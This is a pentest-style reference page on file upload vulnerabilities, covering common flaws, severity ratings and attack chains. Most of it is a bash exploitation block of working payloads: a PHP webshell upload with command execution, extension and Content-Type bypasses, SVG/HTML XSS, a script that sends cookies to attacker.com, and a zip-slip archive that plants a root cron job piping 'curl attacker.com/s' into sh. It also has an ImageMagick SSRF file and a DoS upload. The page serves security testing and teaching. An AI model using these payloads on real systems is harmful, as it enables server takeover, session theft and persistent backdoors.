# File Upload Vulnerabilities

## What it is

Application allows file uploads without sufficient validation of content
type, extension, size, or content. Can lead to RCE (webshell), XSS
(HTML/SVG), DoS, or storage abuse.

**CWE**: CWE-434 (Unrestricted Upload), CWE-436 (Interpretation Conflict)

## Common patterns

- Upload accepts any extension (`.php`, `.jsp`, `.aspx`, `.py`)
- Content-Type validation only (easily spoofed)
- Extension blacklist instead of whitelist (misses `.phtml`, `.php5`, `.shtml`)
- File stored in web-accessible directory with original extension
- No content scanning (magic bytes, virus scan)
- Double extension: `shell.php.jpg` executed as PHP by misconfigured server
- Null byte: `shell.php%00.jpg` (older systems)

## Exploitation

```bash
# Basic webshell upload
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -F "file=@shell.php" "$TARGET/upload"
curl "$TARGET/uploads/shell.php?cmd=id"

# Extension bypass
cp shell.php shell.php.jpg          # double extension
cp shell.php shell.phtml            # alternate PHP extension
cp shell.php shell.php%00.jpg       # null byte (legacy)
cp shell.php shell.PhP              # case variation
cp shell.php .htaccess              # Apache config override

# Content-Type bypass
curl -F "file=@shell.php;type=image/jpeg" "$TARGET/upload"

# Magic bytes bypass (prepend valid image header)
printf '\x89PNG\r\n\x1a\n' > shell.php.png
cat shell_code.php >> shell.php.png
curl -F "file=@shell.php.png" "$TARGET/upload"

# SVG with XSS
cat > xss.svg <<'SVG'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <text x="0" y="20">XSS via SVG</text>
</svg>
SVG
curl -F "file=@xss.svg" "$TARGET/upload"

# HTML upload → stored XSS
echo '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>' > payload.html
curl -F "file=@payload.html" "$TARGET/upload"

# Zip slip (path traversal in archive)
# Create zip with traversal path
python3 -c "
import zipfile
with zipfile.ZipFile('slip.zip','w') as z:
    z.writestr('../../etc/cron.d/backdoor', '* * * * * root curl attacker.com/s|sh')
"
curl -F "file=@slip.zip" "$TARGET/upload"

# ImageMagick exploit (if server processes images)
cat > exploit.mvg <<'MVG'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/ssrf_test)'
pop graphic-context
MVG
curl -F "file=@exploit.mvg" "$TARGET/upload"

# Oversize file (DoS)
dd if=/dev/zero of=big.bin bs=1M count=500
curl -F "file=@big.bin" "$TARGET/upload"
```

## Evidence requirements

- **Demonstrated (RCE)**: uploaded file executed on server — show command
  output (e.g., `id`, `whoami`) from the uploaded webshell
- **Demonstrated (XSS)**: uploaded HTML/SVG served to browser with script
  execution — show the Content-Type in response and script running
- **Inferred**: file uploaded and accessible but execution not confirmed
  (e.g., `.php` file stored but served as download, not executed)
- Always capture: upload request, storage URL, and execution/rendering response

## Severity

| Variant | Severity | Condition |
|---|---|---|
| Webshell upload + execution | Critical | RCE on server |
| HTML/SVG upload → stored XSS | Medium-High | Depends on context |
| Zip slip → arbitrary write | Critical | Write to sensitive paths |
| ImageMagick SSRF/RCE | Critical | Server processes images |
| Unrestricted upload, no execution | Low-Medium | Storage abuse, phishing |
| Oversize file accepted → DoS | Low | Resource exhaustion |
| Upload to cloud storage (S3) directly | Low | Usually not executable |

## Chains

- File upload → webshell → RCE → pivot internal
- File upload → SVG/HTML → stored XSS → session theft
- File upload → zip slip → cron/config overwrite → persistence
- File upload → path traversal → overwrite application files
- File upload → ImageMagick → SSRF → cloud metadata
- File upload → polyglot (valid image + valid PHP) → bypass content validation → RCE
